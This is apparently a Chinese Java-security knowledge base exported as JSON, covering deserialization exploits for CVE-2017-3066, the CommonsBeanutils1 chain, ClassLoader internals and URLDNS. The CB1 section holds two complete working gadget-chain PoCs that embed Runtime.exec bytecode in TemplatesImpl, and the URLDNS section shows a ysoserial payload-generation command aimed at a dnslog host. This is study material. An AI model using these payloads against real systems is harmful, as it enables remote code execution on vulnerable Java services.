(CVE-2017-3066)的漏洞利用这样，将反序列化的数据保存到文本文件，然后直接pasted from burp，将文本文件的二进制流传递给web服务器，但是在我使用node.js的时候发现无法接收到来自POST的请求体，因为在express里要接收对应的POST Body，都是由中间件解析完成，然而其实并不想太麻烦，所以最后使用上传文件的方式来将二进制文件流传入给服务端，然后立马就有了编码问题 0x2 编码问题 我在反复尝试后，将经过网络传输的文件保存下来，再利用模拟的IO操作进行反序列化，发现一直无法反序列化成功，因为在模拟IO操作的地方，我发现有crash，CC2本身在反序列化cc2.ser的时候程序就会crash，然后一直没去调试反序列化的过程，在这里浪费了许多时间 排查思路，需要拿到对应的文件进行判断，是否正常 我在这里选择使用node.js，因为轻便(使用java也行，只是我用node比较快)，简单来看一下问题 npm install express --save npm install multer --save const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 此时通过burp构造一个multipart/form-data，然后对应将cc2.ser 粘贴到burp里 对其进行sha256，与源文件进行对比，发现并不能对上 并且可以看到如下对比，通过pasted from burp 上传到的文件，已经不符合java 序列化文件的类型了 那到底为什么会出现这种情况？我在Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)复现过程遇到过，以前是用低版本burp能复现成功，最开始的时候没有探讨原因，后面在北京的时候问过大佬，说是因为编码问题，只要更改为utf-8就可以了，但是我把所有的编码方式都修改了，发现还是不行，包括还是修改对应的16进制码（只修改了一部分)，还是不行 然后写了一个静态页面，上传页面，注意后端需要修改同源策略，允许跨域访问 const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', req.headers.origin) //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,DELETE,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies7 res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 在此处上传文件发现，通过前端上传的文件，和源文件能相对应上 然后将两个包进行比较，发现序列化数据发生改变了，暂时还不知道如何解决，就是编码问题，从文件里获取的时候，文件内容其实就已经发生了变化 0x3 依赖 在CC链中，我们知道需要特定版本的Commons Collections才能触发反序列化的点，比如Commons Collections 1 需要配合使用JDK1.7 和 Commons Collections 3.1-3.2.1，然而当我直接把本地的jar包放上去之后，调试的时候竟然发现找不到对应的类，这个问题也是搞了好久才发现，一直以为是哪个环节出了问题，最后在pom.xml中引入Commons Collections 组件解决问题 org.apache.commons commons-collections4 4.0 commons-collections commons-collections 3.1 参考链接 https://zhuanlan.zhihu.com/p/386631799 Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:47:10 "},"知识库/02.JAVA安全/20.CommonsBeanutils1/":{"url":"知识库/02.JAVA安全/20.CommonsBeanutils1/","title":"20.CommonsBeanutils1","keywords":"","body":"简介 Apache Commons Beanutils是 Apache Commons工具集中的另一个项目，它提供对 javaBean 的一些操作，javaBean的用于映射数据库的。 环境 CB1 类似于CC2，利用优先级队列触发comparator的compare方法，其中需要以下依赖 commons-collections commons-collections 3.1 commons-beanutils commons-beanutils 1.9.2 commons-logging commons-logging 1.2 Tips CB1 类似于CC2，在Commons Beanutils中提供对JavaBean的一些操作，在commons.beanutils的BeanComparator类中，实现了Comparator和Serializable接口，如下为BeanComparator#compare方法，当this.property为空的时候，则比较o1,o2两个元素，否则则调用PropertyUtils.getProperty(),当o1为对象A，this.property为name,则此时PropertyUtils.getProperty方法会调用A.getName方法 public int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\"IllegalAccessException: \" + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\"InvocationTargetException: \" + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\"NoSuchMethodException: \" + var7.toString()); } } } 在TemplatesImpl中，可以看到在getOutputProperties()方法中，调用了newTransformer()方法， public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 在newTransformer()方法中，调用getTransletInstance()方法，只要_name不为null，_class为null，_bytecode为我们的恶意字节码，那么攻击就能成功 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 那么总结一下，就是如下几点： BeanComparator@property = outputProperties TemplatesImpl@_name != null TemplatesImpl@_bytecodes = 恶意字节码 queue.length >= 2 queue 需要第一次赋值用于序列化，第二次赋值则是反射将对应的恶意字节码放入对应的队列中 comparator 可以先不用放在构造函数中，最后再反射加入queue实例的成员变量中POC package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; public class TestCB1 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f = comparator.getClass().getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); objectOutputStream.close(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } POC_1 将compartor在最后反射写入其中，正常赋值，只是在最后要进行序列化的时候通过反射将其更改 看起来比较多余，相当于对代码进行了review，更明白了反序列化的目的以及反射的高级 package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCB1_1 { public static void main(String[] args)throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f1 = queue.getClass().getDeclaredField(\"comparator\"); f1.setAccessible(true); f1.set(queue,comparator); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cb1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 18:15:57 "},"知识库/02.JAVA安全/21.ClassLoader详解/":{"url":"知识库/02.JAVA安全/21.ClassLoader详解/","title":"21.ClassLoader详解","keywords":"","body":"简介 ClassLoader就是类加载器，普通的Java开发其实利用得并不多，对于某些开发框架中却非常常见，理解ClassLoader的加载机制，有利于写出高效的代码。ClassLoader的具体作用就是将Class文件加载到JVM中，程序就可以正常运行了。但是JVM启动的时候，并不会一次性加载所有的Class文件，而是需要动态加载 Class文件 Java程序是运行在虚拟机中，平常使用idea等工具编写的java代码为.java文件，这就是最基础的源码，但是这类文件是无法直接运行的，如下图所示 当在命令行中对java文件进行编译，然后就会生成class文件 javac HelloWorld.java 然后再执行 java HelloWorld 以上代码是一个示例，是入门Java 语言时的Hello World示例，可以看到class问及哦安是字节码格式文件，Java虚拟机并不能直接识别.java源文件，所以需要javac 将其转换成.class文件。另外，如果用C或者Python编写的程序正确转化成.class文件，java虚拟机也可以识别运行的 环境变量 JAVA_HOME 指Jdk 安装的目录 PATH 指将·${JAVA_HOME}/bin添加到系统PATH变量中，这样就可以任意位置调用java和javac命令，而不是使用绝对路径，或者在${JAVA_HOME}/bin 目录（相对路径）下执行java或者javac命令 CLASSPATH 指向jdk中的lib包，可以理解为刚开始学C语言那会儿，需要安装VC++的库，然后就可以直接使用#include这样，只不过C是直接在环境变量里可以直接调用，jdk的工具类需要单独引用 JAVA类加载流程 Java自带3个类加载器 BootStrapClassLoader 最顶层的加载类，主要加载核心类库，${JAVA_HOME}/lib下的rt.jar、resource.jar、charsets.jar和class等。另外需要注意的是可以通过启动jvm时指定-Xbootclasspath和路径来改变BootStrap ClassLoader的加载目录。比如java -Xbootclasspath/a:path被指定的文件追加到默认的bootstrap路径中 ExtentionClassLoader 扩展的类加载器，加载目录${JAVA_HOME}/lib/ext目录下的jar包和class文件。还可以加载-D java.ext.dirs选项指定的目录 AppClassLoader 也被称为SystyemAppClass 加载当前应用的classpath的所有类 以上3个类加载器，执行顺序如下所示 BootStrap ClassLoader Extention ClassLoader AppClass Loader 为了更好的理解，可以查看源码，sun.misc.Launcher，它是以一个java虚拟机的入口应用 public class Launcher { private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } //设置AppClassLoader为线程上下文类加载器，这个文章后面部分讲解 Thread.currentThread().setContextClassLoader(loader); } /* * Returns the class loader used to launch the main application. */ public ClassLoader getClassLoader() { return loader; } /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader {} /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader {} 源码中有简化，但是可以看到 Launcher 初始化了ExClassLoader 和 AppClassLoader Launcher 中并没有看到BootstrapClassLoader，但是通过System.getProperty(\"sun.boot.class.path\") 得到了字符串bootClassPath，这个就是BootStrapClassLoader加载的jar包 可以看到在${JAVA_HOEM}/jre/lib目录下的jar包和classes ExClassLoader 源码 /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader { static { ClassLoader.registerAsParallelCapable(); } /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { int len = dirs.length; for (int i = 0; i 之前的内容可以指定-D java.ext.dirs参数来添加和改变ExtClassLoader的加载路径 System.out.println(System.getProperty(\"java.ext.dirs\")); APPClassLoader 源码 /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader { public static ClassLoader getAppClassLoader(final ClassLoader extcl) throws IOException { final String s = System.getProperty(\"java.class.path\"); final File[] path = (s == null) ? new File[0] : getClassPath(s); return AccessController.doPrivileged( new PrivilegedAction() { public AppClassLoader run() { URL[] urls = (s == null) ? new URL[0] : pathToURLs(path); return new AppClassLoader(urls, extcl); } }); } ...... } 可以看到AppClassLoader加载的就是java.class.path的值 System.out.println(System.getProperty(\"java.class.path\")); 这个路径其实就是当前Java工程的目录，里面存放的是编译生成的class文件 BootStrapClassLoader、ExtClassLoader、AppClassLoader实际就是查询相应的环境属性：sun.boot.class.path，java.ext.dirs，java.class.path 来加载源文件 然后再来探讨加载顺序，使用上例中的HelloWorld.java创建一个ClassLoaderTest.java文件 // HelloWorld.java public HelloWorld {} // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl); } } ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a 也就是说明HelloWorld就是由AppClassLoader加载的，如果是int.class，String.class的加载呢？ // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); cl = int.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); } } 运行发现报错 ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a Exception in thread \"main\" java.lang.NullPointerException at com.test.ClassLoaderTest.main(ClassLoaderTest.java:8) 提示是空指针，因为int.class 是由BootstrapClassLoader，要想弄明白这些，首先得知道一个前提 每一个类加载器都有一个父加载器 每个类加载器都有一个父加载器，比如加载HelloWorld.class是由AppClassLoader完成，那么AppClassLoader也有一个父加载器，怎样获取呢？很简单，通过getParent方法 // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); System.out.println(\"ClassLoader's parent is \" + cl.getParent().toString()); } } 运行结果如下 ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a ClassLoader's parent is sun.misc.Launcher$ExtClassLoader@45ee12a7 这个就说明AppClassLoader的父加载器是ExtClassLoader，再看示例 // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); System.out.println(\"ClassLoader's parent is \" + cl.getParent().toString()); System.out.println(\"ClassLoader's grandParent is \" + cl.getParent().getParent().toString()); } } 运行结果如下： ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a ClassLoader's parent is sun.misc.Launcher$ExtClassLoader@45ee12a7 Exception in thread \"main\" java.lang.NullPointerException at com.test.ClassLoaderTest.main(ClassLoaderTest.java:8) 进程已结束,退出代码1 又是一个空指针异常，这表明ExClassLoader没有父加载器？如果没有为什么标题要写每一个类加载器都有一个父加载器呢？ 父加载器不是父类 在源码处可以看到ExtClassLoader和AppClassLoader的代码 static class ExtClassLoader extends URLClassLoader {} static class AppClassLoader extends URLClassLoader {} 可以看见ExtClassLoader和AppClassLoader都是继承URLClassLoader，但是在上一节代码中，为什么调用AppClassLoader的getParent()代码会得到ExtClassLoader的实例呢？我们可以先从URLCLassLoader说起 URLClassLoader的源码中并没有找到getParent() 方法，这个方法在ClassLoader.java中 public class Launcher { private static URLStreamHandlerFactory factory = new Factory(); private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { //将ExtClassLoader对象实例传递进去 loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } public ClassLoader getClassLoader () { return loader; } static class ExtClassLoader extends URLClassLoader { /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { //ExtClassLoader在这里创建 return new ExtClassLoader(dirs); } }); } catch (java.security.PrivilegedActionException e) { throw (IOException) e.getException(); } } /* * Creates a new ExtClassLoader for the specified directories. */ public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } } } 可以看到getParent()方法其实就是返回一个ClassLoader对象的parent，parent的赋值是在ClassLoader对象的构造方法中，他有两个情况 由外部类创建ClassLoader时直接指定一个ClassLoader为Parent 由getSystemClaassLoader()方法生成，也就是在sun.misc.Launcher通过getClassLoader()获取，也就是AppClassLoader。直白的说，一个ClassLoader创建时如果没有指定parent，那么它的parent默认就是AppClassLoader 我们主要研究的是ExtClassLoader与AppClassLoader的parent的来源，正好它们与Launcher类有关 public class Launcher { private static URLStreamHandlerFactory factory = new Factory(); private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { //将ExtClassLoader对象实例传递进去 loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } public ClassLoader getClassLoader () { return loader; } static class ExtClassLoader extends URLClassLoader { /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { //ExtClassLoader在这里创建 return new ExtClassLoader(dirs); } }); } catch (java.security.PrivilegedActionException e) { throw (IOException) e.getException(); } } /* * Creates a new ExtClassLoader for the specified directories. */ public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } } } 可以看到，AppClassLoader的parent是一个ExtClassLoader实例 ClassLoader extcl; extcl = ExtClassLoader.getExtClassLoader(); loader = AppClassLoader.getAppClassLoader(extcl) ExtClassLoader并没有直接找到对应的parent赋值，它调用了它的父类也就是URLCLassLoader的构造方法并传递了3个参数 public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } public URLClassLoader(URL[] urls, ClassLoader parent, URLStreamHandlerFactory factory) { super(parent); } 在这里可以看到ExtClassLoader的parent为null，但是ExtClassLoader的父加载器为null，但是BootStrapClassLoader却可以当成他的父加载器 BootStrapClassLoader 是由C/C++编写的，它本身是虚拟机的一部分，所以它并不是Java类，也就是无法在java代码中获取它的引用，JVM启动时是通过BootStrap类加载器加载rt.jar等核心jar包中的class文件，之前的int.class，String.class都是由它加载。在前面我们知道JVM初始化sun.misc.Launcher并创建ExtClassLoader和AppClassLoader实例，并将ExtClassLoader设置为AppClassLoader的父加载器。BootStrap没有父加载器，但是它却可以作用一个ClassLoader的父加载器。比如ExtClassLoader。这也可以解释之前通过ExtClassLoader的getParent方法取为NUll的现象 双亲委托 一个类加载器查找class和resource时，是通过“委托模式”进行的，它首先判断这个class是否已经加载成功，如果没有的话，它并不是自己进行查找，而是先通过父加载器，然后递归下去，知道BootStrapClassloader，如果BootStrapClassloader找到了，直接返回，乳沟没有找到，则一级一级返回，最后到达自身去查找这些对象，这种机制就叫做双亲委托 整个流程如下图所示 一个AppClassLoader查找资源时，先看看缓存是否有，缓存有从缓存中获取，否则委托给父加载器。 递归，重复第1部的操作。 如果ExtClassLoader也没有加载过，则由Bootstrap ClassLoader出面，它首先查找缓存，如果没有找到的话，就去找自己的规定的路径下，也就是sun.mic.boot.class下面的路径。找到就返回，没有找到，让子加载器自己去找。 Bootstrap ClassLoader如果没有查找成功，则ExtClassLoader自己在java.ext.dirs 路径中去查找，查找成功就返回，查找不成功，再向下让子加载器找。 ExtClassLoader查找不成功，AppClassLoader就自己查找，在java.class.path路径下查找。找到就返回。如果没有找到就让子类找，如果没有子类就会抛出各种异常。 重要方法 loadClass() JDK文档是这样写的，通过指定的全限定类名加载class，通过同名的loadClass(String,boolean)方法 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException 一般实现这个方法的步骤是 执行findLoadedClass(String) 去检测这个class是不是已经加载过了 执行父加载器的loadClass方法。如果父加载器为null，则jvm哪值的加载器去替代，也就是BootStrapClassLoader，这也解释了ExtClassLoader的parent为null，但仍然说BootStrapClassLoader是它的父加载器 如果向上委托父加载器没有加载成功，则通过findClass(String)查找 如果class在前面两步中找到吗参数resolve又是true的话，那么loadClass()又会调用resolveClass(class)这个方法来生成最终的Class对象 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // 首先，检测是否已经加载 Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { //父加载器不为空则调用父加载器的loadClass c = parent.loadClass(name, false); } else { //父加载器为空则调用Bootstrap Classloader c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); //父加载器没有找到，则调用findclass c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { //调用resolveClass() resolveClass(c); } return c; } } 代码解释了双亲委托 另外，要注意的是如果要编写一个classLoader的子类，也就是定义一个classloader，建议覆盖findClass()方法，而不要直接修改loadClass()方法 if (parent != null) { //父加载器不为空则调用父加载器的loadClass c = parent.loadClass(name, false); } else { //父加载器为空则调用Bootstrap Classloader c = findBootstrapClassOrNull(name); } 前面说过ExtClassLoader的parent为null，所以它向上委托时，系统会为它指定Bootstrap ClassLoader。 自定义ClassLoader 不管是BootStrapClassLoader还是ExtClassLoader，这些类加载器都只是加载指定目录下的jar包或者资源。那如果需要动态加载一些资源呢？ 自定义步骤 编写一个类继承ClassLoader类 复写他的findClass() 方法 在findClass()方法中调用defineClass() defineClass() 这个方法在编写自定义classloader的时候非常重要，他能将class二进制内容转换成Class对象，如果不符合要求则会抛出各种异常 一个ClassLoader创建时如果没有指定parent，那么他的parent默认就是AppClassloader 上面说的是，如果自定义一个ClassLoader，默认的parent父加载器是AppClassLoader，因为这样就能够保证它能访问系统内置加载器加载成功的class文件。 示例 假设我们需要一个自定义的classloader，默认路径为~/Desktop/lib下的jar包和资源 首先编写一个测试类Test.java package com.test; public class Test{ public void say(){ System.out.println(\"Say Hello\"); } } 然后将其编译成class文件 Test.class放到~/Desktop/lib目录下 package com.test; import java.io.*; public class ClassLoaderTest extends ClassLoader { private String mLibPath; public ClassLoaderTest(String path) { this.mLibPath = path; } protected Class findClass(String name) throws ClassNotFoundException { String filename = getFileName(name); File file = new File(mLibPath, filename); try { FileInputStream fileInputStream = new FileInputStream(file); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int len = 0; try { while ((len = fileInputStream.read()) != -1) { byteArrayOutputStream.write(len); } } catch (IOException e) { e.printStackTrace(); } byte[] bytes = byteArrayOutputStream.toByteArray(); fileInputStream.close(); byteArrayOutputStream.close(); return defineClass(name, bytes, 0, bytes.length); } catch (IOException e) { e.printStackTrace(); } return super.findClass(name); } private String getFileName(String name) { int index = name.lastIndexOf('.'); if (index == -1) { return name + \".class\"; } else { return name.substring(index + 1) + \".class\"; } } } 我们在findClass()方法中定义了查找class的方法，然后数据通过defineClass()生成了Class对象。 测试 现在编写测试代码。我们知道如果调用一个Test对象的say方法，它会输出\"Say Hello\"这条字符串。但现在是我们把Test.class放置在应用工程所有的目录之外，我们需要加载它，然后执行它的方法。 package com.test; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) { ClassLoaderTest classLoaderTest = new ClassLoaderTest(\"~/Desktop/lib\"); try { Class c = classLoaderTest.loadClass(\"com.test.Test\"); if (c != null) { Object object = c.newInstance(); Method method = c.getDeclaredMethod(\"say\",null); method.invoke(object,null); } } catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { throw new RuntimeException(e); } } } 执行之后，可以看到，在~/Desktop/lib/Test.class被加载了 突破了JDK系统内置加载路径的限制之后，我们就可以编写自定义ClassLoader，然后剩下的就叫给开发者你自己了。你可以按照自己的意愿进行业务的定制，将ClassLoader玩出花样来。 总结 ClassLoader是用来加载class文件的 系统内置的ClassLoader通过双亲委托来加载指定路径下的class和资源 可以自定义ClassLoader一般覆盖findClass方法 ContextClassLoader与线程相关，可以获取设置，可以绕过双亲委托机制 参考 https://blog.csdn.net/briblue/article/details/54973413 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-30 14:02:33 "},"知识库/02.JAVA安全/22.URLDNS链分析/":{"url":"知识库/02.JAVA安全/22.URLDNS链分析/","title":"22.URLDNS链分析","keywords":"","body":"URLDNS链利用 先来看看用ysoserial工具怎么利用的。 # 生成序列化Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn/ > a.ser 然后将序列化payload发给对应的目标结合漏洞让他进行反序列化，这里本地直接写个反序列化过程举例了； package org.example; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"/Users/d4m1ts/d4m1ts/tools/java/ysoserial/target/a.ser\")); objectInputStream.readObject(); } } DNSLog成功收到了请求 动态调试ysoserial 简而言之，就是给ysoserial项目加载到idea中，方便我们分析调试。 下载ysoserial项目后，导入到idea中，解决掉依赖问题 有的依赖一直装不上，可以新建个maven项目，然后再给不能下载的依赖放到pom.xml，下载后说不定可以解决。 实在不行就手动下载jar然后导入吧 idea会自动识别ysoserial的主类ysoserial.GeneratePayload，然后直接运行项目即可；我们也可以通过pom.xml文件的mainClass属性看到主类，如果正常显示ysoserial的用法，就说明项目部署成功了。 因为ysoserial生成payload需要传入参数，所以我们手动配置一下项目，传入参数 Run --> Edit Configurations... 然后在Program arguments输入对应的参数 再次运行 生成了序列化数据，说明一切运行成功，就可以用idea开始动态调试了。 URLDNS链分析 URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，尤其是无回显的命令执行，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。 打开ysoserial/payloads/URLDNS.java的源码，可以看到它的调用链 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 这样看还是有点不特别明白，调试分析看看。 模拟对序列化后的ser文件进行反序列化处理，然后分析整个过程，反序列化代码如下（第一节中的反序列化代码）： 